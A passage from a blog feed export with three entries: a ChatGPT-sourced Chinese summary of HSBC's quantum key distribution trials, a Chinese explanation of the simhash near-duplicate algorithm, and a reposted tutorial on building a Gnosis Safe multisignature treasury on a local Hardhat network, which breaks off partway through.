<h3 id="汇丰银行与量子密钥分发QKD的实验技术情况"><a href="#汇丰银行与量子密钥分发QKD的实验技术情况" class="headerlink" title="汇丰银行与量子密钥分发QKD的实验技术情况"></a>汇丰银行与量子密钥分发QKD的实验技术情况</h3><h4 id="技术细节和实施情况："><a href="#技术细节和实施情况：" class="headerlink" title="技术细节和实施情况："></a>技术细节和实施情况：</h4><p>汇丰银行（HSBC）积极参与量子密钥分发（QKD）技术的试验，以增强其金融交易的安全性，并保护其免受未来量子计算机带来的网络威胁。以下是其QKD实施的关键方面：</p>
<ol>
<li><strong>合作伙伴和协作：</strong><ul>
<li>汇丰银行与BT（英国电信）、东芝（Toshiba）和亚马逊网络服务（AWS）等技术提供商合作实施QKD。这些合作旨在为各种金融应用建立安全的量子网络基础设施。</li>
</ul>
</li>
<li><strong>地铁网络试验：</strong><ul>
<li>汇丰银行成为首家加入BT和东芝安全量子“地铁”网络的银行。该网络旨在为机构间提供无条件安全的交易。试验涉及将汇丰银行位于伦敦金丝雀码头的全球总部与位于伯克郡的数据中心通过63公里的光纤链路连接。</li>
</ul>
</li>
<li><strong>使用案例和应用：</strong><ul>
<li>汇丰银行的QKD试验的主要使用案例是确保<strong>外汇（FX）交易</strong>的安全。一个显著的试验涉及使用QKD保护从欧元到美元的3000万欧元交易场景中的高度敏感的交易数据。</li>
<li>汇丰银行还探索了其他应用，如安全视频通信和边缘计算，利用QKD确保这些场景中的数据完整性和安全性。</li>
</ul>
</li>
<li><strong>技术优势：</strong><ul>
<li>QKD利用量子物理的基本特性生成不受窃听或网络攻击的加密密钥。这意味着任何试图截取或篡改数据的行为都可以立即被检测到，为金融交易提供了显著的网络安全飞跃​。</li>
</ul>
</li>
<li><strong>未来影响：</strong><ul>
<li>汇丰银行的试验旨在将QKD整合到其最关键的交易工具和金融系统中，确保它们在量子计算技术进步时仍然安全。这种前瞻性的方法展示了汇丰银行在应对潜在网络威胁和制定未来网络安全措施方面的承诺​。<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3>汇丰银行在QKD方面的参与代表了金融网络安全的重大进展，特别是在应对未来量子计算机带来的威胁方面。通过与领先的技术提供商合作并在现实场景中成功进行试验，汇丰银行正在为银行业量子密码学的实施设立标准。<br>（注：以上内容来自于ChatGPT）</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>密码学</tag>
        <tag>量子</tag>
      </tags>
  </entry>
  <entry>
    <title>海量信息查重-simhash</title>
    <url>/2021/05/27/%E6%B5%B7%E9%87%8F%E4%BF%A1%E6%81%AF%E6%9F%A5%E9%87%8D-simhash/</url>
    <content><![CDATA[<p>​    造成网页近重复的可能原因主要包括：镜像网站；内容复制；嵌入广告；计数改变；少量修改<br>​    传统比较两个文本相似性的方法，大多是将文本分词之后，转化为特征向量距离的度量，比如常见的欧氏距离、海明距离或者余弦角度等等。两两比较固然能很好地适应，但这种方法的一个最大的缺点就是，无法将其扩展到海量数据。例如，试想像Google那种收录了数以几十亿互联网信息的大型搜索引擎，每天都会通过爬虫的方式为自己的索引库新增的数百万网页，如果待收录每一条数据都去和网页库里面的每条记录算一下余弦角度，其计算量是相当恐怖的。<br>​    考虑采用为每一个web文档通过hash的方式生成一个指纹（fingerprint）。但是，传统的加密式hash，比如md5，其设计的目的是为了让整个分布尽可能地均匀，输入内容哪怕只有轻微变化，hash就会发生很大地变化。我们理想当中的哈希函数，需要对几乎相同的输入内容，产生相同或者相近的hashcode，换句话说，hashcode的相似程度要能直接反映输入内容的相似程度。很明显，前面所说的md5等传统hash无法满足我们的需求。<br>​    <a href="http://jacoxu.com/%e5%85%b3%e4%ba%8esimhash%e7%ae%97%e6%b3%95%e5%8e%9f%e7%90%86/">simhash</a>是locality sensitive hash（局部敏感哈希）的一种，它产生的hash签名在一定程度上可以表征原内容的相似度。最早由Moses Charikar在《similarity estimation techniques from rounding algorithms》一文中提出。Google就是基于此算法实现网页文件查重的。假设有以下三段文本：<br>​    <strong>the cat sat on the mat</strong><br>​    <strong>the cat sat on a mat</strong><br>​    <strong>we all scream for ice cream</strong><br>使用传统hash可能会产生如下的结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">irb(main):006:0&gt; p1 = ‘the cat sat on the mat’</span><br><span class="line">irb(main):005:0&gt; p2 = ‘the cat sat on a mat’</span><br><span class="line">irb(main):007:0&gt; p3 = ‘we all scream for ice cream’</span><br><span class="line">irb(main):007:0&gt; p1.hash</span><br><span class="line">=&gt; 415542861</span><br><span class="line">irb(main):007:0&gt; p2.hash</span><br><span class="line">=&gt; 668720516</span><br><span class="line">irb(main):007:0&gt; p3.hash</span><br><span class="line">=&gt; 767429688</span><br></pre></td></tr></table></figure>

<p>使用simhash会应该产生类似如下的结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">irb(main):003:0&gt; p1.simhash</span><br><span class="line">=&gt; 851459198</span><br><span class="line">00110010110000000011110001111110</span><br><span class="line">irb(main):004:0&gt; p2.simhash</span><br><span class="line">=&gt; 847263864</span><br><span class="line">00110010100000000011100001111000</span><br><span class="line">irb(main):002:0&gt; p3.simhash</span><br><span class="line">=&gt; 984968088</span><br><span class="line">00111010101101010110101110011000</span><br></pre></td></tr></table></figure>

<p>​    海明距离的定义，为两个二进制串中不同位的数量。上述三个文本的simhash结果，其两两之间的海明距离为(p1,p2)=4，(p1,p3)=16以及(p2,p3)=12。事实上，这正好符合文本之间的相似度，p1和p2间的相似度要远大于与p3的。距离越小，则相似度越大。一般大文本去重，大小&lt;=3的即可判断为重复。<br>​    如何实现这种hash算法呢？simhash算法分为5个步骤：1、分词、2、hash、3、加权、4、合并、5、降维</p>
<ol>
<li>分词：</li>
</ol>
<p>选择适合自己的分词库进行分词即可。<br>如“欢迎来到随迹”-&gt;（分词后）“欢迎”、“来到”、“随迹”</p>
<ol start="2">
<li>hash：</li>
</ol>
<p>对每个词计算其hash值，hash值为二进制数01组成的n-bit签名。<br>设“欢迎“（100101）、“来到”（101011）、“随迹”（101011）</p>
<ol start="3">
<li>加权：</li>
</ol>
<p>对于给定的文本，权值即为分词后对应词出现的数量。给所有特征向量进行加权，即W = Hash * weight；这里我们假设三个词权值分别为4、5、9；<br>根据计算规则遇到1则hash值和权值正相乘，遇到0则hash值和权值负相乘<br>例如给“欢迎”的hash值“100101”加权得 到：W(欢迎) = 1001014 = 4 -4 -4 4 -4 4，给“来到”的hash值“101011”加权得到：W(来到)=1010115 = 5 -5 5 -5 5 5，剩下的按此规则计算</p>
<ol start="4">
<li>合并：</li>
</ol>
<p>将上述各个特征向量的加权结果累加，变成只有一个序列串。拿前两个特征向量举例，例如“欢迎”的“4 -4 -4 4 -4 4”和“来到”的“5 -5 5 -5 5 5”进行累加，得到“4+5 -4+-5 -4+5 4+-5 -4+5 4+5”，得到“9 -9 1 -1 1”。</p>
<ol start="5">
<li>降维：</li>
</ol>
<p>对于n-bit签名的累加结果，如果大于0则置1，否则置0，从而得到该语句的simhash值，最后我们便可以根据不同语句simhash的海 明距离来判断它们的相似度。例如把上面计算出来的“9 -9 1 -1 1 9”降维（某位大于0记为1，小于0记为0），得到的01串为：“1 0 1 0 1 1”，从而形成它们的simhash签名。</p>
<p><img src="/2021/05/27/%E6%B5%B7%E9%87%8F%E4%BF%A1%E6%81%AF%E6%9F%A5%E9%87%8D-simhash/%E6%B5%B7%E9%87%8F%E4%BF%A1%E6%81%AF%E6%9F%A5%E9%87%8D-simhash%5C1.png"></p>
]]></content>
  </entry>
  <entry>
    <title>深入gnosis-safe</title>
    <url>/2022/04/01/%E6%B7%B1%E5%85%A5gnosis-safe/</url>
    <content><![CDATA[<p><a href="https://blog.logrocket.com/build-treasury-wallet-multisignature-gnosis-safe/">Build a treasury wallet with multisignature Gnosis Safe - LogRocket Blog</a></p>
<p>Imagine you and your friends are building an <a href="https://blog.logrocket.com/create-nft-upload-metadata-ipfs/">NFT marketplace</a>. You are the CEO and your friend works as a Solidity engineer who writes the smart contract. The NFT marketplace becomes popular, and your revenue builds from the market fee of every NFT sale transaction. You store your profit inside a smart contract, and boast to the media about your company that has enough money to buy a private island. Then, the Solidity engineer disappears and withdraws all the funds from the treasury. You watch in horror.</p>
<p>Now, you vow not to fall into the same trap again. From now on, every sensitive transaction in a smart contract needs approval from a certain number of people. For example, withdrawing funds from your treasury requires at least 60 percent approval from certain key people. If there are five key people, at least three approvals are needed.</p>
<p>Luckily, you don’t need to build this mechanism from scratch; you can use <a href="https://gnosis-safe.io/">Gnosis Safe</a> to interact with your NFT marketplace. You put the funds inside the Gnosis Safe smart contracts, and withdrawing the funds now requires at least a certain number of signatures. A rogue agent cannot steal the funds anymore, and you’re back to saving up for a private island!</p>
<p>Gnosis Safe is a project from <a href="https://gnosis.io/">Gnosis</a>. Gnosis started as a <a href="https://whitepaper.io/document/116/gnosis-whitepaper">prediction markets platform</a> where people can trade information freely. As part of the project, the team behind Gnosis created Gnosis Safe to secure funds for multiple participants. Today, it’s the most popular multisig wallet smart contract on Ethereum. Search “multisig wallet Ethereum” on Google and you will find Gnosis in the top results.</p>
<p>In this article, you will learn how to set up a treasury wallet with Gnosis Safe, so you can protect your funds on the Ethereum blockchain.</p>
<h2 id="Setting-up-Gnosis-Safe-smart-contracts"><a href="#Setting-up-Gnosis-Safe-smart-contracts" class="headerlink" title="Setting up Gnosis Safe smart contracts"></a>Setting up Gnosis Safe smart contracts</h2><p>You can clone the Gnosis Safe smart contract from their GitHub repo like so:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/gnosis/safe-contracts.git</span></span><br></pre></td></tr></table></figure>

<p>Use a specific version so you can follow this tutorial:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> safe-contracts</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout v1.3.0-libs.0</span></span><br></pre></td></tr></table></figure>

<p>With this specific version, the deployed addresses of Gnosis Safe will be deterministic.</p>
<p>Let’s deploy Gnosis Safe to the <a href="https://hardhat.org/">Hardhat</a> development network. But first, you must install Hardhat inside the <code>safe-contracts</code> directory:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yarn add hardhat</span></span><br></pre></td></tr></table></figure>

<p>Then, run the Hardhat development network and deploy the Gnosis Safe smart contracts:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npx hardhat node</span></span><br><span class="line">Nothing to compile</span><br><span class="line">sending eth to create2 contract deployer address (0x3fab184622dc19b6109349b94811493bf2a45362) (tx: 0x076c3e6eb9678931c92e0322885f48ebdc064226483a9bae4866f99c7f8aa8bb)...</span><br><span class="line">deploying create2 deployer contract (at 0x4e59b44847b379578588920ca78fbf26c0b4956c) using deterministic deployment (https://github.com/Arachnid/deterministic-deployment-proxy) (tx: 0xeddf9e61fb9d8f5111840daef55e5fde0041f5702856532cdbb5a02998033d26)...</span><br><span class="line">deploying &quot;SimulateTxAccessor&quot; (tx: 0xfc6d7c491688840e79ed7d8f0fc73494be305250f0d5f62d04c41bc4467e8603)...: deployed at 0x59AD6735bCd8152B84860Cb256dD9e96b85F69Da with 237871 gas</span><br><span class="line">deploying &quot;GnosisSafeProxyFactory&quot; (tx: 0x6fff529768b3c5660234fcd53d5d04918aadc935a90ec05aca1796649bf4f699)...: deployed at 0xa6B71E26C5e0845f74c812102Ca7114b6a896AB2 with 867594 gas</span><br><span class="line">deploying &quot;DefaultCallbackHandler&quot; (tx: 0x406498f13d684b2db11ac78d1b06c2b38657f02e729ecebc677b7ea28a30e712)...: deployed at 0x1AC114C2099aFAf5261731655Dc6c306bFcd4Dbd with 542473 gas</span><br><span class="line">deploying &quot;CompatibilityFallbackHandler&quot; (tx: 0xe7426790ce3fed5ba2083b5e5b911b561a306d3f26fbd5c0d0d6c0c1d5847e3f)...: deployed at 0xf48f2B2d2a534e402487b3ee7C18c33Aec0Fe5e4 with 1238095 gas</span><br><span class="line">deploying &quot;CreateCall&quot; (tx: 0xa602d00962fa8de99f84dbefd62f831f179d12e549863bd305607bbb775f5c81)...: deployed at 0x7cbB62EaA69F79e6873cD1ecB2392971036cFAa4 with 294718 gas</span><br><span class="line">deploying &quot;MultiSend&quot; (tx: 0x8790b4413d0b4336586897f0bf40a72cdcfcb8fd06aed8a164fac5ecf662e0f6)...: deployed at 0xA238CBeb142c10Ef7Ad8442C6D1f9E89e07e7761 with 190004 gas</span><br><span class="line">deploying &quot;MultiSendCallOnly&quot; (tx: 0xb4ccc0ce8099412d505d0ab131ce9fffb1915a5053906875fc301528ebe79f1a)...: deployed at 0x40A2aCCbd92BCA938b02010E17A5b8929b49130D with 142122 gas</span><br><span class="line">deploying &quot;SignMessageLib&quot; (tx: 0xdf0d113415ea15354de8e816b793ca89e5a9a7d4ad7b48e1344872d0f4aacdbf)...: deployed at 0xA65387F16B013cf2Af4605Ad8aA5ec25a2cbA3a2 with 262353 gas</span><br><span class="line">deploying &quot;GnosisSafeL2&quot; (tx: 0x83b42dd66a2e282b3e76cb10fb4ab93da970b0454010faef142ab8c6a5c4233d)...: deployed at 0x3E5c63644E683549055b9Be8653de26E0B4CD36E with 5200241 gas</span><br><span class="line">deploying &quot;GnosisSafe&quot; (tx: 0xea94214f16af5e66646518db2403a6e24b17973d6bbb0208fc40f01343b0225f)...: deployed at 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552 with 5017833 gas</span><br><span class="line">Started HTTP and WebSocket JSON-RPC server at http://127.0.0.1:8545/</span><br></pre></td></tr></table></figure>

<p>The Gnosis Safe smart contracts are not just one smart contract; they are many. But you need to pay attention to three smart contracts in particular: <code>MultiSend</code>, <code>GnosisSafe</code>, and <code>GnosisSafeProxyFactory</code>. You need their addresses when you use the Gnosis Safe SDK later.</p>
<p>So what are these three smart contracts?</p>
<p><code>GnosisSafe</code> is the core safe smart contract, and everyone only needs one. Your startup and your business competitors can use the same deployed <code>GnosisSafe</code>, so you don’t need to deploy it separately if it has been deployed already.</p>
<p>You don’t interact directly with <code>GnosisSafe</code>. You use a proxy, called <code>GnosisSafeProxy</code>. Because of this, your startup and your business competitor need to use different <code>GnosisSafeProxy</code>s. To create your own <code>GnosisSafeProxy</code>, you can use <code>GnosisSafeProxyFactory</code>.</p>
<p><code>MultiSend</code> is a helper smart contract to batch multiple transactions into one. You may want to buy a yacht as your startup office, pay salary to a meme artist, and pay taxes to the country where your startup resides. Instead of executing these transactions one by one, you can batch them into one with this helper smart contract, then execute them in one go.</p>
<p>There are other smart contracts as part of the Gnosis Safe, but you don’t touch them directly. You only deal with the three smart contracts mentioned previously. That’s why the Gnosis Safe SDK requires you to provide their addresses.</p>
<p>If you use Gnosis Safe in other networks like Ethereum mainnet or Rinkeby, you don’t need to deploy the Gnosis Safe smart contracts because the team behind Gnosis Safe already deployed these core ones. You just need to find their addresses and write them down. But since you are using the Hardhat development network, you need to do this step.</p>
<p>Let the process run peacefully. You can open a new terminal and create your project that interacts with these smart contracts in the new terminal.</p>
<h2 id="Installing-the-Gnosis-Safe-SDK-libraries"><a href="#Installing-the-Gnosis-Safe-SDK-libraries" class="headerlink" title="Installing the Gnosis Safe SDK libraries"></a>Installing the Gnosis Safe SDK libraries</h2><p>The Gnosis Safe SDK libraries are Node.js libraries. To use them, you need to create a Node project. Let’s create one by creating an empty directory and initialize it with yarn:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir our-treasury</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> our-treasury</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yarn init -y</span></span><br><span class="line">yarn init v1.22.11</span><br><span class="line">warning The yes flag has been set. This will automatically answer yes to all questions, which may have security implications.</span><br><span class="line">success Saved package.json</span><br><span class="line">Done in 0.02s.</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">package.json</span><br></pre></td></tr></table></figure>

<p>To interact with Ethereum in Node, you have two choices: <code>web3.js</code> and <code>ethers.js</code>. In this tutorial, you’ll use the <code>ethers.js</code> library. Install the library with yarn like so:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yarn add ethers</span></span><br></pre></td></tr></table></figure>

<p>You will put the Ethereum addresses on the <code>.env</code> file instead of hard-coding them, so you need the <code>dotenv</code> library:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yarn add dotenv</span></span><br></pre></td></tr></table></figure>

<p>Lastly, you need the Gnosis Safe SDK libraries:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yarn add @gnosis.pm/safe-core-sdk @gnosis.pm/safe-ethers-lib</span></span><br></pre></td></tr></table></figure>

<p>These are the core libraries that you’re going to learn how to use in this tutorial to interface with the Gnosis Safe smart contracts.</p>
<h2 id="Setting-up-the-env-file"><a href="#Setting-up-the-env-file" class="headerlink" title="Setting up the .env file"></a>Setting up the .env file</h2><p>Instead of hard-coding the Ethereum addresses, you can store them as environment variables. But setting up environment variables in a terminal before executing a script is a hassle:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> ACCOUNT_1=0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> ACCOUNT_2=0x70997970c51812dc3a010c7d01b50e0d17dc79c8</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> node index.js</span></span><br></pre></td></tr></table></figure>

<p>It’s better if you use the <code>.env</code> file. Basically, you use the <code>dotenv</code> library to load the environment variables from the <code>.env</code> file. That way, you only need to set up the environment variables once.</p>
<p>Create the <code>.env</code> file with the following content:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ACCOUNT_1=&quot;0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266&quot;</span><br><span class="line">ACCOUNT_2=&quot;0x70997970c51812dc3a010c7d01b50e0d17dc79c8&quot;</span><br><span class="line">ACCOUNT_3=&quot;0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc&quot;</span><br><span class="line">ACCOUNT_4=&quot;0x90f79bf6eb2c4f870365e785982e1f101e93b906&quot;</span><br><span class="line">ACCOUNT_5=&quot;0x15d34aaf54267db7d7c367839aaf71a00a2c6a65&quot;</span><br><span class="line">ACCOUNT_6=&quot;0x9965507d1a55bcc2695c58ba16fb37d819b0a4dc&quot;</span><br><span class="line">ACCOUNT_7=&quot;0x976ea74026e726554db657fa54763abd0c3a0aa9&quot;</span><br><span class="line">MULTI_SEND_ADDRESS=&quot;0xA238CBeb142c10Ef7Ad8442C6D1f9E89e07e7761&quot;</span><br><span class="line">SAFE_MASTER_COPY_ADDRESS=&quot;0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552&quot;</span><br><span class="line">SAFE_PROXY_FACTORY_ADDRESS=&quot;0xa6B71E26C5e0845f74c812102Ca7114b6a896AB2&quot;</span><br></pre></td></tr></table></figure>

<p>In the code above, you can see that the addresses for <code>MULTI_SEND_ADDRESS</code>, <code>SAFE_MASTER_COPY_ADDRESS</code>, <code>SAFE_PROXY_FACTORY_ADDRESS</code> are the same as the ones in the first terminal. As a reminder, the first terminal is the terminal where you’ve deployed the Gnosis Safe smart contracts on the Hardhat development network. Later, in your client code, you will load these smart contracts’ addresses from the <code>.env</code> file to interact with the deployed smart contracts on the Hardhat development network.</p>
<p>The <code>ACCOUNT_1</code> and other accounts are the sample Ethereum addresses provided by the Hardhat development node. If you run <code>npx hardhat node</code> in a new Hardhat project, you will get 20 sample Ethereum addresses with their private keys for development. Each account has 10,000ETH. In this <code>.env</code> file, you just took the first seven addresses.</p>
<h2 id="Creating-the-treasury"><a href="#Creating-the-treasury" class="headerlink" title="Creating the treasury"></a>Creating the treasury</h2><p>Let’s create the <code>index.js</code> file. This is where you will write the code to build the treasury with Gnosis Safe:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> edit index.js <span class="comment"># replace edit with vim or code or your favorite editor</span></span></span><br></pre></td></tr></table></figure>

<p>First things first, you want to be able to read the variables you put in the <code>.env</code> file. So add this line:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).config();</span><br></pre></td></tr></table></figure>

<p>Then, you import the Gnosis Safe SDK library:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; SafeFactory, SafeAccountConfig, ContractNetworksConfig &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@gnosis.pm/safe-core-sdk&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> Safe = <span class="built_in">require</span>(<span class="string">&#x27;@gnosis.pm/safe-core-sdk&#x27;</span>)[<span class="string">&quot;default&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>To make things clearer, imagine that you’re creating a web3 startup to disrupt traditional banks. There are five people who are building this startup, with you acting as the CEO. The other people on the team are the CTO, a Solidity engineer, a meme artist, and an advisor.</p>
<p>An angel investor sends money to your startup. The money is put inside the safe smart contract. It takes three of five signatures from your team to approve any transactions related to this smart contract. You, as the CEO, decide to buy a yacht for your startup office. You will need two other signatures from your team to approve this transaction. Let’s do it!</p>
<h2 id="Setting-up-multisignature-authorization-in-Gnosis-Safe-wallet"><a href="#Setting-up-multisignature-authorization-in-Gnosis-Safe-wallet" class="headerlink" title="Setting up multisignature authorization in Gnosis Safe wallet"></a>Setting up multisignature authorization in Gnosis Safe wallet</h2><p>To protect your company’s treasury from being emptied by a single member, you have to make sure that three out of your five team members approve of the yacht purchase. Let’s add this functionality now.</p>
<p>Still in the same file, <code>index.js</code>, add these lines below the <code>const Safe = require…</code> line:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ceo = process.env.ACCOUNT_1;</span><br><span class="line"><span class="keyword">const</span> cto = process.env.ACCOUNT_2;</span><br><span class="line"><span class="keyword">const</span> meme_artist = process.env.ACCOUNT_3;</span><br><span class="line"><span class="keyword">const</span> solidity_engineer = process.env.ACCOUNT_4;</span><br><span class="line"><span class="keyword">const</span> advisor = process.env.ACCOUNT_5;</span><br><span class="line"><span class="keyword">const</span> investor = process.env.ACCOUNT_6;</span><br><span class="line"><span class="keyword">const</span> yacht_shop = process.env.ACCOUNT_7;</span><br></pre></td></tr></table></figure>

<p>Here, you load up the addresses you stored on the <code>.env</code> file in <code>index.js</code>. This way, to change the addresses, you don’t need to change the code.</p>
<p>Then, set up a provider from the <code>ethers.js</code> library:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&#x27;ethers&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.JsonRpcProvider();</span><br></pre></td></tr></table></figure>

<p>A <a href="https://docs.ethers.io/v5/api/providers/provider/">provider</a> is an Ethereum connection object. Here, you create an abstraction of a JSON-RPC connection to an Ethereum node.</p>
<p>From this provider, you create three signers from three addresses. Remember, you only need three signatures to approve a transaction in the safe:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ceo_signer = provider.getSigner(ceo);</span><br><span class="line"><span class="keyword">const</span> cto_signer = provider.getSigner(cto);</span><br><span class="line"><span class="keyword">const</span> advisor_signer = provider.getSigner(advisor);</span><br></pre></td></tr></table></figure>

<p>The Gnosis Safe smart contracts work with the <code>ethers.js</code> library and the <code>web3.js</code> library. In this tutorial, you are using <code>ethers.js</code>. So you need the adapter that works with <code>ethers.js</code>:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> EthersAdapter = <span class="built_in">require</span>(<span class="string">&#x27;@gnosis.pm/safe-ethers-lib&#x27;</span>)[<span class="string">&quot;default&quot;</span>];</span><br><span class="line"><span class="keyword">const</span> ethAdapter_ceo = <span class="keyword">new</span> EthersAdapter(&#123; ethers, <span class="attr">signer</span>: ceo_signer &#125;);</span><br><span class="line"><span class="keyword">const</span> ethAdapter_cto = <span class="keyword">new</span> EthersAdapter(&#123; ethers, <span class="attr">signer</span>: cto_signer &#125;);</span><br><span class="line"><span class="keyword">const</span> ethAdapter_advisor = <span class="keyword">new</span> EthersAdapter(&#123; ethers, <span class="attr">signer</span>: advisor_signer &#125;);</span><br></pre></td></tr></table></figure>

<p>In the code above, you interacted with the Gnosis Safe SDK using these adapters. Note that each address needs its own adapter.</p>
<p>Next, create the <code>main</code>, asynchronous function. You will use <a href="https://hardhat.org/getting-started/#deploying-your-contracts">this pattern to handle</a> <code>async/await</code> and handle errors in the code properly:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// FROM NOW ON, YOUR CODE IS PUT HERE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .then(<span class="function">() =&gt;</span> process.exit(<span class="number">0</span>))</span><br><span class="line">  .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(error);</span><br><span class="line">    process.exit(<span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>As explained in the beginning of the tutorial, the only way to create a safe is from the safe factory that is shared with everyone. So first, you need to create a safe factory object connecting to the safe factory smart contract, <code>GnosisSafeProxyFactory</code>:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> id = <span class="keyword">await</span> ethAdapter_ceo.getChainId();</span><br><span class="line"><span class="keyword">const</span> contractNetworks = &#123;</span><br><span class="line">  [id]: &#123;</span><br><span class="line">    multiSendAddress: process.env.MULTI_SEND_ADDRESS,</span><br><span class="line">    safeMasterCopyAddress: process.env.SAFE_MASTER_COPY_ADDRESS,</span><br><span class="line">    safeProxyFactoryAddress: process.env.SAFE_PROXY_FACTORY_ADDRESS</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> safeFactory = <span class="keyword">await</span> SafeFactory.create(&#123; <span class="attr">ethAdapter</span>: ethAdapter_ceo, <span class="attr">contractNetworks</span>: contractNetworks &#125;);</span><br></pre></td></tr></table></figure>

<p>In the code above, you first received the chain ID. Then, you created an object containing three smart contracts with which you safe will interact. Finally, you created a safe factory.</p>
<p>Next, create a safe from this safe factory like so:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> owners = [ceo, cto, meme_artist, solidity_engineer, advisor];</span><br><span class="line"><span class="keyword">const</span> threshold = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> safeAccountConfig = &#123; <span class="attr">owners</span>: owners, <span class="attr">threshold</span>: threshold&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> safeSdk_ceo = <span class="keyword">await</span> safeFactory.deploySafe(&#123;safeAccountConfig&#125;);</span><br></pre></td></tr></table></figure>

<p>The safe needs the addresses of the members and the minimum amount of signatures required to approve transactions for this safe. In the code above, you put all members of the startup and <code>3</code> as the threshold. To deploy a safe, you can use the <code>deploySafe</code> method from the safe factory.</p>
<p>Now that you have a safe already, an investor sends money to your startup, which would look like this:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> treasury = safeSdk_ceo.getAddress();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ten_ethers = ethers.utils.parseUnits(<span class="string">&quot;10&quot;</span>, <span class="string">&#x27;ether&#x27;</span>).toHexString();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> params = [&#123;</span><br><span class="line">      <span class="keyword">from</span>: investor,</span><br><span class="line">      to: treasury,</span><br><span class="line">      value: ten_ethers</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> provider.send(<span class="string">&quot;eth_sendTransaction&quot;</span>, params);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Fundraising.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>The safe holds your treasury. The investor sent 10ETH using the <code>eth_sendTransaction</code> RPC method.</p>
<p>To make sure it works, you can check the balance of the treasury with the following:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> balance = <span class="keyword">await</span> safeSdk_ceo.getBalance();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Initial balance of the treasury: <span class="subst">$&#123;ethers.utils.formatUnits(balance, <span class="string">&quot;ether&quot;</span>)&#125;</span> ETH`</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Obtaining-multisignature-approval"><a href="#Obtaining-multisignature-approval" class="headerlink" title="Obtaining multisignature approval"></a>Obtaining multisignature approval</h2><p>Once the investor’s money is in, you can move fast. Create a transaction to buy a yacht like so:</p>
